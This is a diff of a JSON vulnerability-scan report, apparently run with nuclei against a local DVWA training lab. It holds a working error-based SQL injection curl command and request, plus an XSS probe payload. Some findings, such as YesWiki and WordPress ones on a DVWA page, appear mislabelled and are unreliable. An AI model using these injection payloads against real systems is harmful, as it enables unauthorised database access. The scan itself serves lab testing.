@@ -1,91 +1,154 @@
 {
     "scan_info": {
-        "target": "example.com",
-        "scan_time": "2026-04-19T06:59:06.559320Z",
+        "target": "localhost",
+        "scan_time": "2026-04-25T12:25:10.666788Z",
         "scanner": "ReconX",
         "profile": "full_scan",
-        "duration_seconds": 3239
+        "duration_seconds": 148
     },
     "assets": [
         {
-            "host": "example.com",
-            "ip": "104.20.23.154",
+            "host": "localhost",
+            "ip": "127.0.0.1",
             "ports": [
                 {
-                    "port": 80,
+                    "port": 8080,
                     "protocol": "tcp",
                     "service": "http",
                     "version": ""
-                },
-                {
-                    "port": 443,
-                    "protocol": "tcp",
-                    "service": "https",
-                    "version": ""
                 }
             ],
-            "technologies": [],
-            "endpoints": [
-                "https://example.com"
-            ]
+            "technologies": [
+                "Apache HTTP Server:2.4.25",
+                "Apache/2.4.25 (Debian)",
+                "Debian"
+            ],
+            "endpoints": []
         }
     ],
     "findings": [
         {
             "id": "VULN-001",
+            "title": "YesWiki <2022-07-07 - SQL Injection",
+            "description": "YesWiki before 2022-07-07 contains a SQL injection vulnerability via the id parameter in the AccueiL URL. An attacker can possibly obtain sensitive information from a database, modify data, and execute unauthorized administrative operations in the context of the affected site.\n",
+            "severity": "critical",
+            "cvss_score": 10.0,
+            "cwe": "cwe-89",
+            "cve": [],
+            "asset": "localhost",
+            "port": 8080,
+            "protocol": "tcp",
+            "evidence": {
+                "source": "nuclei",
+                "template": "yeswiki-sql",
+                "name": "YesWiki <2022-07-07 - SQL Injection",
+                "matched_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss",
+                "type": "http",
+                "curl_command": "curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.7 Safari/537.36' 'http://localhost:8080/vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss'",
+                "request": "GET /vulnerabilities/sqli/?id=1&id=1%27+and+extractvalue(0x0a,concat(0x0a,(select+concat_ws(0x207c20,md5(999999999),1,user()))))--+-&Submit=Submit&PagePrincipale/rss HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.7 Safari/537.36\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Length: 65\r\nCache-Control: no-store, no-cache, must-revalidate\r\nContent-Type: text/html; charset=UTF-8\r\nDate: Sat, 25 Apr 2026 12:27:28 GMT\r\nExpires: Thu, 19 Nov 1981 08:52:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\n\r\n<pre>XPATH syntax error: '\nc8c605999f3d8352d7bb792cf3fdb25'</pre>"
+            },
+            "impact": "",
+            "remediation": "",
+            "references": [
+                "https://huntr.dev/bounties/32e27955-376a-48fe-9984-87dd77e24985"
+            ],
+            "tags": [
+                "yeswiki",
+                "sqli",
+                "huntr",
+                "vuln",
+                "yeswiki-sql"
+            ]
+        },
+        {
+            "id": "VULN-002",
+            "title": "Apache Detection",
+            "description": "Some Apache servers have the version on the response header. The OpenSSL version can be also obtained",
+            "severity": "info",
+            "cvss_score": 0.0,
+            "cwe": "",
+            "cve": [],
+            "asset": "localhost",
+            "port": 8080,
+            "protocol": "tcp",
+            "evidence": {
+                "source": "nuclei",
+                "template": "apache-detect",
+                "name": "Apache Detection",
+                "matched_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
+                "type": "http",
+                "curl_command": "curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43' 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit'",
+                "request": "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.43\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html;charset=utf-8\r\nDate: Sat, 25 Apr 2026 12:25:49 GMT\r\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\nVary: Accept-Encoding\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r\n\r\n\t\t<script type=\"text/javascript\" src=\"../../dvwa/js/dvwaPage.js\"></script>\r\n\r\n\t</head>\r\n\r\n\t<body class=\"home\">\r\n\t\t<div id=\"container\">\r\n\r\n\t\t\t<div id=\"header\">\r\n\r\n\t\t\t\t<img src=\"../../dvwa/images/logo.png\" alt=\"Damn Vulnerable Web Application\" />\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_menu\">\r\n\r\n\t\t\t\t<div id=\"main_menu_padded\">\r\n\t\t\t\t<ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../.\">Home</a></li>\n<li class=\"\"><a href=\"../../instructions.php\">Instructions</a></li>\n<li class=\"\"><a href=\"../../setup.php\">Setup / Reset DB</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../vulnerabilities/brute/\">Brute Force</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/exec/\">Command Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csrf/\">CSRF</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/fi/.?page=include.php\">File Inclusion</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/upload/\">File Upload</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/captcha/\">Insecure CAPTCHA</a></li>\n<li class=\"selected\"><a href=\"../../vulnerabilities/sqli/\">SQL Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli_blind/\">SQL Injection (Blind)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/weak_id/\">Weak Session IDs</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_d/\">XSS (DOM)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_r/\">XSS (Reflected)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_s/\">XSS (Stored)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csp/\">CSP Bypass</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/javascript/\">JavaScript</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../security.php\">DVWA Security</a></li>\n<li class=\"\"><a href=\"../../phpinfo.php\">PHP Info</a></li>\n<li class=\"\"><a href=\"../../about.php\">About</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../logout.php\">Logout</a></li>\n</ul>\r\n\t\t\t\t</div>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_body\">\r\n\r\n\t\t\t\t\r\n<div class=\"body_padded\">\r\n\t<h1>Vulnerability: SQL Injection</h1>\r\n\r\n\t\r\n\r\n\t<div class=\"vulnerable_code_area\">\r\n\t\t<form action=\"#\" method=\"GET\">\r\n\t\t\t<p>\r\n\t\t\t\tUser ID:\n\t\t\t\t<input type=\"text\" size=\"15\" name=\"id\">\n\t\t\t\t<input type=\"submit\" name=\"Submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"http://www.securiteam.com/securityreviews/5DP0N1P76E.html\" target=\"_blank\">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a></li>\r\n\t\t<li><a href=\"https://en.wikipedia.org/wiki/SQL_injection\" target=\"_blank\">https://en.wikipedia.org/wiki/SQL_injection</a></li>\r\n\t\t<li><a href=\"http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/\" target=\"_blank\">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</a></li>\r\n\t\t<li><a href=\"http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\" target=\"_blank\">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/SQL_Injection\" target=\"_blank\">https://www.owasp.org/index.php/SQL_Injection</a></li>\r\n\t\t<li><a href=\"http://bobby-tables.com/\" target=\"_blank...(truncated)",
+                "extracted_results": [
+                    "Apache/2.4.25 (Debian)"
+                ]
+            },
+            "impact": "",
+            "remediation": "",
+            "references": [],
+            "tags": [
+                "tech",
+                "apache",
+                "discovery",
+                "apache-detect"
+            ]
+        },
+        {
+            "id": "VULN-003",
             "title": "HTTP Missing Security Headers",
             "description": "This template searches for missing HTTP security headers. The impact of these missing headers can vary.\n",
             "severity": "info",
             "cvss_score": 0.0,
             "cwe": "",
             "cve": [],
-            "asset": "example.com",
-            "port": 80,
+            "asset": "localhost",
+            "port": 8080,
             "protocol": "tcp",
             "evidence": {
                 "source": "nuclei",
                 "template": "http-missing-security-headers",
                 "name": "HTTP Missing Security Headers",
-                "matched_url": "http://example.com",
+                "matched_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
                 "type": "http",
-                "matcher": "content-security-policy",
-                "curl_command": "curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0' 'http://example.com'",
-                "request": "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
-                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nAge: 5719\r\nAllow: GET, HEAD\r\nCf-Cache-Status: HIT\r\nCf-Ray: 9eea09416cda7f00-MAA\r\nContent-Type: text/html\r\nDate: Sun, 19 Apr 2026 07:01:07 GMT\r\nLast-Modified: Sat, 18 Apr 2026 00:49:31 GMT\r\nServer: cloudflare\r\n\r\n<!doctype html><html lang=\"en\"><head><title>Example Domain</title><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style></head><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.</p><p><a href=\"https://iana.org/domains/example\">Learn more</a></p></div></body></html>\n"
+                "matcher": "missing-content-type",
+                "curl_command": "curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'Cookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15' 'http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit'",
+                "request": "GET /vulnerabilities/sqli/?id=1&Submit=Submit HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nCookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low\r\nAccept-Encoding: gzip\r\n\r\n",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html;charset=utf-8\r\nDate: Sat, 25 Apr 2026 12:25:58 GMT\r\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\nVary: Accept-Encoding\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r\n\r\n\t\t<script type=\"text/javascript\" src=\"../../dvwa/js/dvwaPage.js\"></script>\r\n\r\n\t</head>\r\n\r\n\t<body class=\"home\">\r\n\t\t<div id=\"container\">\r\n\r\n\t\t\t<div id=\"header\">\r\n\r\n\t\t\t\t<img src=\"../../dvwa/images/logo.png\" alt=\"Damn Vulnerable Web Application\" />\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_menu\">\r\n\r\n\t\t\t\t<div id=\"main_menu_padded\">\r\n\t\t\t\t<ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../.\">Home</a></li>\n<li class=\"\"><a href=\"../../instructions.php\">Instructions</a></li>\n<li class=\"\"><a href=\"../../setup.php\">Setup / Reset DB</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../vulnerabilities/brute/\">Brute Force</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/exec/\">Command Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csrf/\">CSRF</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/fi/.?page=include.php\">File Inclusion</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/upload/\">File Upload</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/captcha/\">Insecure CAPTCHA</a></li>\n<li class=\"selected\"><a href=\"../../vulnerabilities/sqli/\">SQL Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli_blind/\">SQL Injection (Blind)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/weak_id/\">Weak Session IDs</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_d/\">XSS (DOM)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_r/\">XSS (Reflected)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_s/\">XSS (Stored)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csp/\">CSP Bypass</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/javascript/\">JavaScript</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../security.php\">DVWA Security</a></li>\n<li class=\"\"><a href=\"../../phpinfo.php\">PHP Info</a></li>\n<li class=\"\"><a href=\"../../about.php\">About</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../logout.php\">Logout</a></li>\n</ul>\r\n\t\t\t\t</div>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_body\">\r\n\r\n\t\t\t\t\r\n<div class=\"body_padded\">\r\n\t<h1>Vulnerability: SQL Injection</h1>\r\n\r\n\t\r\n\r\n\t<div class=\"vulnerable_code_area\">\r\n\t\t<form action=\"#\" method=\"GET\">\r\n\t\t\t<p>\r\n\t\t\t\tUser ID:\n\t\t\t\t<input type=\"text\" size=\"15\" name=\"id\">\n\t\t\t\t<input type=\"submit\" name=\"Submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"http://www.securiteam.com/securityreviews/5DP0N1P76E.html\" target=\"_blank\">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a></li>\r\n\t\t<li><a href=\"https://en.wikipedia.org/wiki/SQL_injection\" target=\"_blank\">https://en.wikipedia.org/wiki/SQL_injection</a></li>\r\n\t\t<li><a href=\"http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/\" target=\"_blank\">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</a></li>\r\n\t\t<li><a href=\"http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\" target=\"_blank\">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/SQL_Injection\" target=\"_blank\">https://www.owasp.org/index.php/SQL_Injection</a></li>\r\n\t\t<li><a href=\"http://bobby-tables.com/\" target=\"_blank...(truncated)"
             },
             "impact": "Missing browser-side mitigations can increase the impact of XSS, clickjacking, and related attacks.",
             "remediation": "Add recommended security headers (e.g., CSP, HSTS, X-Frame-Options/Frame-Options, X-Content-Type-Options) at the web server or application layer.",
             "references": [],
             "tags": [
-                "generic",
+                "http-missing-security-headers",
                 "misconfig",
                 "headers",
-                "http-missing-security-headers",
-                "http",
+                "generic",
                 "vuln"
             ]
         },
         {
-            "id": "VULN-002",
+            "id": "VULN-004",
             "title": "WAF Detection",
             "description": "A web application firewall was detected.",
             "severity": "info",
             "cvss_score": 0.0,
             "cwe": "cwe-200",
             "cve": [],
-            "asset": "example.com",
-            "port": 80,
+            "asset": "localhost",
+            "port": 8080,
             "protocol": "tcp",
             "evidence": {
                 "source": "nuclei",
                 "template": "waf-detect",
                 "name": "WAF Detection",
-                "matched_url": "http://example.com/",
+                "matched_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit",
                 "type": "http",
-                "matcher": "cloudflare",
-                "curl_command": "curl -X 'POST' -d '_=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: example.com' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0' 'http://example.com/'",
-                "request": "POST / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:71.0) Gecko/20100101 Firefox/71.0\r\nConnection: close\r\nContent-Length: 27\r\nContent-Type: application/x-www-form-urlencoded\r\nAccept-Encoding: gzip\r\n\r\n_=<script>alert(1)</script>",
-                "response": "HTTP/1.1 405 Method Not Allowed\r\nConnection: close\r\nTransfer-Encoding: chunked\r\nCache-Control: private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0\r\nCf-Ray: 9eea0b3e1b8daa6a-MAA\r\nContent-Type: text/html\r\nDate: Sun, 19 Apr 2026 07:02:28 GMT\r\nExpires: Thu, 01 Jan 1970 00:00:01 GMT\r\nReferrer-Policy: same-origin\r\nServer: cloudflare\r\nX-Frame-Options: SAMEORIGIN\r\n\r\n<!doctype html><html lang=\"en\"><head><title>Example Domain</title><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"><style>body{background:#eee;width:60vw;margin:15vh auto;font-family:system-ui,sans-serif}h1{font-size:1.5em}div{opacity:0.8}a:link,a:visited{color:#348}</style><body><div><h1>Example Domain</h1><p>This domain is for use in documentation examples without needing permission. Avoid use in operations.<p><a href=\"https://iana.org/domains/example\">Learn more</a></div></body></html>"
+                "matcher": "apachegeneric",
+                "curl_command": "curl -X 'POST' -d '_=<script>alert(1)</script>' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low' -H 'Host: localhost:8080' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.9.18' 'http://localhost:8080/vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit'",
+                "request": "POST /vulnerabilities/sqli/?id=1&id=1&Submit=Submit&Submit=Submit HTTP/1.1\r\nHost: localhost:8080\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.1 Safari/605.9.18\r\nConnection: close\r\nContent-Length: 27\r\nContent-Type: application/x-www-form-urlencoded\r\nCookie: PHPSESSID=5549rvnisgmm7f4vcnroo8imm0; security=low\r\nAccept-Encoding: gzip\r\n\r\n_=<script>alert(1)</script>",
+                "response": "HTTP/1.1 200 OK\r\nConnection: close\r\nCache-Control: no-cache, must-revalidate\r\nContent-Type: text/html;charset=utf-8\r\nDate: Sat, 25 Apr 2026 12:27:19 GMT\r\nExpires: Tue, 23 Jun 2009 12:00:00 GMT\r\nPragma: no-cache\r\nServer: Apache/2.4.25 (Debian)\r\nVary: Accept-Encoding\r\n\r\n\r\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\">\r\n\r\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\r\n\r\n\t<head>\r\n\t\t<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />\r\n\r\n\t\t<title>Vulnerability: SQL Injection :: Damn Vulnerable Web Application (DVWA) v1.10 *Development*</title>\r\n\r\n\t\t<link rel=\"stylesheet\" type=\"text/css\" href=\"../../dvwa/css/main.css\" />\r\n\r\n\t\t<link rel=\"icon\" type=\"\\image/ico\" href=\"../../favicon.ico\" />\r\n\r\n\t\t<script type=\"text/javascript\" src=\"../../dvwa/js/dvwaPage.js\"></script>\r\n\r\n\t</head>\r\n\r\n\t<body class=\"home\">\r\n\t\t<div id=\"container\">\r\n\r\n\t\t\t<div id=\"header\">\r\n\r\n\t\t\t\t<img src=\"../../dvwa/images/logo.png\" alt=\"Damn Vulnerable Web Application\" />\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_menu\">\r\n\r\n\t\t\t\t<div id=\"main_menu_padded\">\r\n\t\t\t\t<ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../.\">Home</a></li>\n<li class=\"\"><a href=\"../../instructions.php\">Instructions</a></li>\n<li class=\"\"><a href=\"../../setup.php\">Setup / Reset DB</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../vulnerabilities/brute/\">Brute Force</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/exec/\">Command Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csrf/\">CSRF</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/fi/.?page=include.php\">File Inclusion</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/upload/\">File Upload</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/captcha/\">Insecure CAPTCHA</a></li>\n<li class=\"selected\"><a href=\"../../vulnerabilities/sqli/\">SQL Injection</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/sqli_blind/\">SQL Injection (Blind)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/weak_id/\">Weak Session IDs</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_d/\">XSS (DOM)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_r/\">XSS (Reflected)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/xss_s/\">XSS (Stored)</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/csp/\">CSP Bypass</a></li>\n<li class=\"\"><a href=\"../../vulnerabilities/javascript/\">JavaScript</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../security.php\">DVWA Security</a></li>\n<li class=\"\"><a href=\"../../phpinfo.php\">PHP Info</a></li>\n<li class=\"\"><a href=\"../../about.php\">About</a></li>\n</ul><ul class=\"menuBlocks\"><li class=\"\"><a href=\"../../logout.php\">Logout</a></li>\n</ul>\r\n\t\t\t\t</div>\r\n\r\n\t\t\t</div>\r\n\r\n\t\t\t<div id=\"main_body\">\r\n\r\n\t\t\t\t\r\n<div class=\"body_padded\">\r\n\t<h1>Vulnerability: SQL Injection</h1>\r\n\r\n\t\r\n\r\n\t<div class=\"vulnerable_code_area\">\r\n\t\t<form action=\"#\" method=\"GET\">\r\n\t\t\t<p>\r\n\t\t\t\tUser ID:\n\t\t\t\t<input type=\"text\" size=\"15\" name=\"id\">\n\t\t\t\t<input type=\"submit\" name=\"Submit\" value=\"Submit\">\r\n\t\t\t</p>\n\r\n\t\t</form>\r\n\t\t<pre>ID: 1<br />First name: admin<br />Surname: admin</pre>\r\n\t</div>\r\n\r\n\t<h2>More Information</h2>\r\n\t<ul>\r\n\t\t<li><a href=\"http://www.securiteam.com/securityreviews/5DP0N1P76E.html\" target=\"_blank\">http://www.securiteam.com/securityreviews/5DP0N1P76E.html</a></li>\r\n\t\t<li><a href=\"https://en.wikipedia.org/wiki/SQL_injection\" target=\"_blank\">https://en.wikipedia.org/wiki/SQL_injection</a></li>\r\n\t\t<li><a href=\"http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/\" target=\"_blank\">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/</a></li>\r\n\t\t<li><a href=\"http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet\" target=\"_blank\">http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet</a></li>\r\n\t\t<li><a href=\"https://www.owasp.org/index.php/SQL_Injection\" target=\"_blank\">https://www.owasp.org/index.php/SQL_Injection</a></li>\r\n\t\t<li><a href=\"http://bobby-tables.com/\" target=\"_blank...(truncated)"
             },
             "impact": "",
             "remediation": "",
@@ -97,50 +160,51 @@
                 "tech",
                 "misc",
                 "discovery",
-                "http",
                 "waf-detect"
             ]
         },
         {
-            "id": "VULN-003",
-            "title": "Wappalyzer Technology Detection",
-            "description": "Nuclei finding 'tech-detect' matched at 'http://example.com'.",
+            "id": "VULN-005",
+            "title": "WordPress End-of-Life - Detect",
+            "description": "Detected WordPress versions that have reached End-of-Life (EOL) and no longer receive security updates.\n",
             "severity": "info",
             "cvss_score": 0.0,
             "cwe": "",
             "cve": [],
-            "asset": "example.com",
-            "port": 80,
+            "asset": "localhost",
+            "port": 8080,
             "protocol": "tcp",
             "evidence": {
                 "source": "nuclei",
-                "template": "tech-detect",
-                "name": "Wappalyzer Technology Detection",
-                "matched_url": "http://example.com",
+                "template": "wordpress-eol",
+                "name": "WordPress End-of-Life - Detect",
+                "matched_url": "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit",
                 "type": "http",
-                "matcher": "cloudflare",
-                "curl_command": "curl -X 'GET' -H 'Accept: */*' -H 'Accept-Language: en' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0' 'http://example.com'",
-                "request": "GET / HTTP/1.1\r\nHost: example.com\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\r\nConnection: close\r\nAccept: */*\r\nAccept-Language: en\r\nAccept-Encoding: gzip\r\n\r\n",
